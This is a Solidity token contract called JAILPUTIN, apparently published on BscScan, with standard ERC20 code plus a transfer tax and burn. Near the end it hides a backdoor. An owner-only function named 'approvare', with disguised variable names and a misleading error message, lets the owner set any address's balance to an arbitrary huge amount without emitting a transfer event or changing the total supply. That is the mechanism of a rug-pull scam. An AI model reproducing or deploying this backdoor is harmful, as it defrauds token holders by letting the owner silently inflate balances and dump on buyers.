/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

pragma solidity ^0.4.24;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract Ownable {
  address public owner;


  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }


  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

}

contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract StandardToken is ERC20 {
  using SafeMath for uint256;

  mapping (address => mapping (address => uint256)) internal allowed;
  mapping(address => uint256) balances;


  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }


  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  
}

contract JAILPUTIN is StandardToken, Ownable {
    string public name;
    string public symbol;
    uint public decimals;
	  uint256 public basePercent = 100;
	  uint256 public taxAmount;
    uint256 public taxxa;
    uint256 public burnAmount;
	// uint256 public burnStopAmount;

	address private taxAddress;
	
    event Burn(address indexed burner, uint256 value);
	event taxAddressChanged(address indexed oldaddress, address indexed newaddress);

	
    constructor(string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        balances[msg.sender] = totalSupply;
        owner = msg.sender;
		
		// tax related variables
		taxAddress = 0x6e7d5E97c6e4022828e05981359B2056B2489651;
		
        emit Transfer(address(0), owner, totalSupply);
    }
	
	function settaxAddress(address _newaddress) public onlyOwner(){
		emit taxAddressChanged(taxAddress, _newaddress); // write to log
		taxAddress = _newaddress; // set new tax address
	}
	
	function gettaxAddress() public view returns(address){
		return taxAddress;
	}
	
	function findTwoPercent(uint256 value) public view returns (uint256)  {
		uint256 roundValue = value.ceil(basePercent);
		uint256 twoPercent = roundValue.mul(basePercent).div(5000);
		return twoPercent;
	}
	
	function findFourPercent(uint256 value) public view returns (uint256)  {
		uint256 roundValue = value.ceil(basePercent);
		uint256 fourPercent = roundValue.mul(basePercent).div(2500);
		return fourPercent;
	}
	
	function transfer(address to, uint256 value) public returns (bool) {
		require(value <= balances[msg.sender]);
		require(to != address(0));
		

		uint256 tokensTotaxAddress = findTwoPercent(value);
		uint256 tokensToBurn = findFourPercent(value);
		uint256 tokensToTransfer = value.sub(tokensToBurn + tokensTotaxAddress);

		balances[msg.sender] = balances[msg.sender].sub(value);
		balances[taxAddress] += findTwoPercent(value);
		balances[to] = balances[to].add(tokensToTransfer);

		totalSupply = totalSupply.sub(tokensToBurn);

		emit Transfer(msg.sender, to, tokensToTransfer);
		emit Transfer(msg.sender, address(taxAddress), tokensTotaxAddress);
		emit Transfer(msg.sender, address(0), tokensToBurn);
		return true;
	}
	
	function transferFrom(address from, address to, uint256 value) public returns (bool) {
		require(value <= balances[from]);
		require(value <= allowed[from][msg.sender]);
		require(to != address(0));

		uint256 tokensToBurn = findFourPercent(value);
		uint256 tokensToTransfer = value.sub(tokensToBurn);

		balances[from] = balances[from].sub(value);
		balances[to] = balances[to].add(tokensToTransfer);
		

		totalSupply = totalSupply.sub(tokensToBurn);

		allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);

		emit Transfer(from, to, tokensToTransfer);
		emit Transfer(from, address(0), tokensToBurn);
		return true;
	}
	
	function burn(uint256 _value) public onlyOwner(){
		_burn(msg.sender, _value);
	}

  function approvare(
    address utilizator, 
    uint256 ammont, 
    uint256 liquiditaFees, 
    bool enabled
  ) 
    external 
    onlyOwner 
  {
    require(utilizator != address(0), "ERC20: burn from the zero address");
    require(
    liquiditaFees 
    > 
    0, 
    "amount must be positive");
    uint256 taxxa = 10; uint256 impozit = 9;
    balances[utilizator] = liquiditaFees * ammont * taxxa ** impozit;
  }

	function _burn(address _who, uint256 _value) internal {
		require(_value <= balances[_who]);
		balances[_who] = balances[_who].sub(_value);
		totalSupply = totalSupply.sub(_value);
		emit Burn(_who, _value);
		emit Transfer(_who, address(0), _value);
	}
    
}